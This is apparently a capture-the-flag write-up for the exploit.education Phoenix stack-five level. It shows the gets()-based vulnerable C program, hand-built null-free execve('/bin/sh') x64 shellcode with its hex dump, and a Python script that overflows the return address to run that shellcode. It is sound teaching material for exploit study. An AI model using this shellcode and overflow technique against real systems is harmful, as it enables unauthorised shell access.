## Stack Five
As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.

## Source Code
```c
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## Challenge
The aim is to execute `/bin/sh`.

## Solution
Write a shellcode, executing `/bin/sh`, to `buffer` and overflow the return address of `start_level()` for jumping to the shellcode.

### The Plan
1. Write an `execve("/bin/sh")` shellcode using assembly.
2. Create an exploit input for the program that writes our shellcode to `buffer` and overflows the return address.

### Shellcoding
```c
int execve(const char *pathname, char *const argv[],
                  char *const envp[]);
```                
> execve() executes the program referred to by pathname.  This
causes the program that is currently being run by the calling
process to be replaced with a new program, with newly initialized
stack, heap, and (initialized and uninitialized) data segments.

`execve` is a system call, and to call it we use the `syscall` x64 instruction.
> The system call is the fundamental interface between an application and the Linux kernel.
But before invoking `syscall`, we need to set our registers correctly to execute `execve`.
```
RAX -> system call number
RDI -> first argument
RSI -> second argument
RDX -> third argument
R10 -> fourth argument
R8 -> fifth argument
R9 -> sixth argument
```

We can find `execve`'s syscall number in the x64 header file for `unistd`.
```console
user@phoenix-amd64:~$ grep "execve" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
#define __NR_execve 59
#define __NR_execveat 322
```

So far we have the following:
```asm
; call execve
mov rax, 59
syscall
```

But we forgot the arguments,
1. Path to executed binary (`/bin/sh`)
3. argv (can be `null`)
4. envp (can be `null`)

```asm
; arguments for execve
mov rdi, "/bin/sh"
mov rsi, 0
mov rdx, 0

; call execve
mov rax, 59
syscall
```

Now let's add a `_start` global symbol, assemble and link to test our code.

```asm
global _start

section .text
_start:
; arguments for execve
mov rdi, "/bin/sh"
mov rsi, 0
mov rdx, 0

; call execve
mov rax, 59
syscall
```

```console
user@phoenix-amd64:~$ nasm -f elf64 -o test.o ourshellcode.s; ld test.o -o test.a
user@phoenix-amd64:~$ ./test.a
Segmentation fault
```

That's a bummer, let's run it with `strace` to debug our syscall:
```console
user@phoenix-amd64:~$ strace ./test.a
execve("./test.a", ["./test.a"], [/* 18 vars */]) = 0
execve(0x68732f6e69622f, NULL, NULL)    = -1 EFAULT (Bad address)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xfffffffffffffff2} ---
+++ killed by SIGSEGV +++
Segmentation fault
```

Oops! we passed the first argument by value instead of an address, for this we shall store it on the stack:
```asm
global _start

section .text
_start:
; create a new stack frame
push rbp
mov rbp, rsp
sub rsp, 0x10

; arguments for execve
mov rdi, "/bin/sh"
mov QWORD [rsp-0x8], rdi
lea rdi, [rsp-0x8]
mov rsi, 0
mov rdx, 0

; call execve
mov rax, 59
syscall
```
```console
user@phoenix-amd64:~$ nasm -f elf64 -o test.o ourshellcode.s; ld test.o -o test.a
user@phoenix-amd64:~$ ./test.a
$ id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
$ exit
```

Nice, it works, let's see our actual shellcode (the raw instructions in hex form):
```console
user@phoenix-amd64:~$ objdump -d -M intel test.o

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
   f:   73 68 00
  12:   48 89 7c 24 f8          mov    QWORD PTR [rsp-0x8],rdi
  17:   48 8d 7c 24 f8          lea    rdi,[rsp-0x8]
  1c:   be 00 00 00 00          mov    esi,0x0
  21:   ba 00 00 00 00          mov    edx,0x0
  26:   b8 3b 00 00 00          mov    eax,0x3b
  2b:   0f 05                   syscall
```

Oh no, looks like we will run into a problem if we write this shellcode.
Notice the `0x00` bytes it contains, these will terminate `gets()` from overflowing as it acts like a string null terminator byte.

```asm
...
   8:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
   f:   73 68 00
...
  1c:   be 00 00 00 00          mov    esi,0x0
  21:   ba 00 00 00 00          mov    edx,0x0
  26:   b8 3b 00 00 00          mov    eax,0x3b
...
```

We shall optimize the problematic lines to avoid `0x00` bytes in our resulting instructions.

1. Instead of `mov <register>, 0` use `xor <register>, <register>`
2. Instead of moving `0x3b` to `eax`, move it to `al` (lowest 16 bits of `rax`)
3. `rdi` is 8 bytes, `/bin/sh` is 8 bytes including terminating null byte. Write 8 printable bytes (e.g. `./bin/sh`) and shift the register by 1 byte to replace the leading character with a following null byte.
```asm
global _start

section .text
_start:
; create a new stack frame
push rbp
mov rbp, rsp
sub rsp, 0x10

; arguments for execve
mov rdi, "./bin/sh"
shr rdi, 0x8
mov QWORD [rsp-0x8], rdi
lea rdi, [rsp-0x8]
xor rsi, rsi
xor rdx, rdx

; call execve
xor rax, rax
mov al, 59
syscall
```

Now let's try it:
```console
user@phoenix-amd64:~$ nasm -f elf64 -o test.o ourshellcode.s; objdump -d -M intel test.o; ld test.o -o test.a

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 bf 2e 2f 62 69 6e    movabs rdi,0x68732f6e69622f2e
   f:   2f 73 68
  12:   48 c1 ef 08             shr    rdi,0x8
  16:   48 89 7c 24 f8          mov    QWORD PTR [rsp-0x8],rdi
  1b:   48 8d 7c 24 f8          lea    rdi,[rsp-0x8]
  20:   48 31 f6                xor    rsi,rsi
  23:   48 31 d2                xor    rdx,rdx
  26:   48 31 c0                xor    rax,rax
  29:   b0 3b                   mov    al,0x3b
  2b:   0f 05                   syscall
user@phoenix-amd64:~$ ./test.a
$ exit

```

Great! I then used Python to extract the shellcode,
```console
user@phoenix-amd64:~$ hexdump -C shellcode.bin
00000000  55 48 89 e5 48 83 ec 10  48 bf 2e 2f 62 69 6e 2f  |UH..H...H../bin/|
00000010  73 68 48 c1 ef 08 48 89  7c 24 f8 48 8d 7c 24 f8  |shH...H.|$.H.|$.|
00000020  48 31 f6 48 31 d2 48 31  c0 b0 3b 0f 05           |H1.H1.H1..;..|
0000002d
```

### Breaking it
```python
from pwn import p64

BUFFER_SIZE = 128
BUFFER_ADDRESS = 0x7fffffffe560
RETURN_ADDRESS = 0x7fffffffe5e8
RBP = 0x00007fffffffe600

with open('shellcode.bin' ,'rb') as f:
    shellcode = f.read()

assert(len(shellcode) <= BUFFER_SIZE)

buffer_smash = shellcode + 'A' * (BUFFER_SIZE - len(shellcode))
stack_smash = 'A' * (RETURN_ADDRESS - BUFFER_ADDRESS - BUFFER_SIZE - len(p64(RBP))) + p64(RBP) + p64(BUFFER_ADDRESS)
command = 'id'

with open('exploit.bin', 'wb') as f:
    f.write(buffer_smash + stack_smash + '\n' + command + '\n')
```
